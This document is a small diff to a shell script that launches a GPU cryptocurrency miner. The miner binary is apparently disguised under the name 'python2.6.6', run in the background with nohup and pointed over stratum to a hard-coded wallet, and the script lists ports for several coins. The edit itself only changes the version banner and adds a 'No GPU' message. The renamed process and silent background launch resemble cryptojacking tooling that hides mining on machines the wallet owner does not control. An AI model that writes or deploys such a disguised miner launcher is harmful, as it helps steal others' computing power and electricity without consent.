@@ -8,7 +8,7 @@ ETPort=443
 RVPort=80
 VCPort=8080
 XMProt=21
-echo -e '################## '"MAX $PROX"' Ver:0.2.2     ################'
+echo -e '################## '"MAX $PROX"' Ver:0.2.3     ################'
 echo -e '##########################################################################'
 
 ## getting IP info
@@ -230,6 +230,7 @@ then
     nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -G 2>> oout 1>> oout &
     fi
 else
+    echo "No GPU"
 fi
 
 
